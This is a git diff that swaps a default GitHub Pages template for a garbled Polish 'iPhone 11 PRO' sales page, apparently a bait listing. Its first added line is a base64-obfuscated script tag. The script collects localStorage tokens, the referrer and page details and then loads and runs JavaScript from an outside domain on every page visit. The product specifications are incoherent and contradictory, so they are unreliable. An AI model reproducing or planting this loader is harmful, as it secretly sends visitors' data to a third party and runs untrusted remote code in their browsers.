@@ -1,37 +1,21 @@
-## Welcome to GitHub Pages
+<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfenFrYzJYc2h5SEx2aFpCNic7CiAgICBpZiAoIXdpbmRvdy5fenFrYzJYc2h5SEx2aFpCNikgewogICAgICAgIHdpbmRvdy5fenFrYzJYc2h5SEx2aFpCNiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly9rZWl0YWxpby5zcGFjZS93Mk5YaldrMycsCiAgICAgICAgICAgIFBfUEFUSDogJ2h0dHBzOi8va2VpdGFsaW8uc3BhY2UvZjZlNWU3ZS9wb3N0YmFjaycsCiAgICAgICAgfTsKICAgIH0KICAgIGNvbnN0IF9DcjM0cGZXUVpxWVdnQkxWID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ2NvbmZpZycpOwogICAgaWYgKHR5cGVvZiBfQ3IzNHBmV1FacVlXZ0JMViAhPT0gJ3VuZGVmaW5lZCcgJiYgX0NyMzRwZldRWnFZV2dCTFYgIT09IG51bGwpIHsKICAgICAgICB2YXIgX215TDZZMTN0QjVaaHdGeUggPSBKU09OLnBhcnNlKF9DcjM0cGZXUVpxWVdnQkxWKTsKICAgICAgICB2YXIgX01RTHZwUUd2WFZNeDRXVkQgPSBNYXRoLnJvdW5kKCtuZXcgRGF0ZSgpLzEwMDApOwogICAgICAgIGlmIChfbXlMNlkxM3RCNVpod0Z5SC5jcmVhdGVkX2F0ICsgd2luZG93Ll96cWtjMlhzaHlITHZoWkI2LnR0bCA8IF9NUUx2cFFHdlhWTXg0V1ZEKSB7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdzdWJJZCcpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgndG9rZW4nKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ2NvbmZpZycpOwogICAgICAgIH0KICAgIH0KICAgIHZhciBfRkx5a0hDUlRCTDZUTm1wOSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdzdWJJZCcpOwogICAgdmFyIF9tUGJuQ0I1YmN4TmJMNW5GID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3Rva2VuJyk7CiAgICB2YXIgXzh3bjU5TlQyeXpWRHRxa3ogPSAnP3JldHVybj1qcy5jbGllbnQnOwogICAgICAgIF84d241OU5UMnl6VkR0cWt6ICs9ICcmJyArIGRlY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24uc2VhcmNoLnJlcGxhY2UoJz8nLCAnJykpOwogICAgICAgIF84d241OU5UMnl6VkR0cWt6ICs9ICcmc2VfcmVmZXJyZXI9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5yZWZlcnJlcik7CiAgICAgICAgXzh3bjU5TlQyeXpWRHRxa3ogKz0gJyZkZWZhdWx0X2tleXdvcmQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC50aXRsZSk7CiAgICAgICAgXzh3bjU5TlQyeXpWRHRxa3ogKz0gJyZsYW5kaW5nX3VybD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmxvY2F0aW9uLmhvc3RuYW1lICsgZG9jdW1lbnQubG9jYXRpb24ucGF0aG5hbWUpOwogICAgICAgIF84d241OU5UMnl6VkR0cWt6ICs9ICcmbmFtZT0nICsgZW5jb2RlVVJJQ29tcG9uZW50KG5hbWUpOwogICAgaWYgKHR5cGVvZiBfRkx5a0hDUlRCTDZUTm1wOSAhPT0gJ3VuZGVmaW5lZCcgJiYgX0ZMeWtIQ1JUQkw2VE5tcDkgJiYgd2luZG93Ll96cWtjMlhzaHlITHZoWkI2LnVuaXF1ZSkgewogICAgICAgIF84d241OU5UMnl6VkR0cWt6ICs9ICcmc3ViX2lkPScgKyBlbmNvZGVVUklDb21wb25lbnQoX0ZMeWtIQ1JUQkw2VE5tcDkpOwogICAgfQogICAgaWYgKHR5cGVvZiBfbVBibkNCNWJjeE5iTDVuRiAhPT0gJ3VuZGVmaW5lZCcgJiYgX21QYm5DQjViY3hOYkw1bkYgJiYgd2luZG93Ll96cWtjMlhzaHlITHZoWkI2LnVuaXF1ZSkgewogICAgICAgIF84d241OU5UMnl6VkR0cWt6ICs9ICcmdG9rZW49JyArIGVuY29kZVVSSUNvbXBvbmVudChfbVBibkNCNWJjeE5iTDVuRik7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fenFrYzJYc2h5SEx2aFpCNi5SX1BBVEggKyBfOHduNTlOVDJ5elZEdHFrejsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA=="></script>
 
-You can use the [editor on GitHub](https://github.com/amazoniphone/get/edit/master/index.md) to maintain and preview the content for your website in Markdown files.
+<img src="https://knwmeg.github.io/iphone/PL2.jpg"/>
 
-Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.
+## iPhone 11 PRO
 
-### Markdown
+Apple iPhone 11PROoryginalny iOS 4G LTE 3 GB RAM 12.0MP sześciordzeniowy odcisk palca fabrycznie odblokowany telefon komórkowy   
 
-Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for
+### Dane techniczne
 
-```markdown
-Syntax highlighted code block
+Nazwa marki: Apple
+Model Apple: IPhone 11 Plus 3 GB 64 GB
+Typ baterii: niedostępny
+Przebudzenie pamięci: 64 GB
+Linia produktów: Nie buve w pracy
+System operacyjny: iOS
+Technologia: skaner linii papilarnych
+W trybie aparatu: Pierwszy aparat: 1 rok baterie (mA * h): = <2691 mAh Szybka ładowarka: Adaptacyjne szybkie ładowanie Szybka ładowarka: Zasilanie przez USB Typ telefonu: smartfon Typ ekranu dotykowego: angielski Rosyjski   
+Pamięć operacyjna 3: do operatora: So Typ matrycy: IPS Główny czujnik kamery: wbudowany rdzeń procesora: 6-rdzeniowy Punkt sprzedaży: 2017
 
-# Header 1
-## Header 2
-### Header 3
-
-- Bulleted
-- List
-
-1. Numbered
-2. List
-
-**Bold** and _Italic_ and `Code` text
-
-[Link](url) and ![Image](src)
-```
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
-
-### Jekyll Themes
-
-Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/amazoniphone/get/settings). The name of this theme is saved in the Jekyll `_config.yml` configuration file.
-
-### Support or Contact
-
-Having trouble with Pages? Check out our [documentation](https://help.github.com/categories/github-pages-basics/) or [contact support](https://github.com/contact) and we’ll help you sort it out.
+Detalie [Apple Store](https://www.apple.com/).
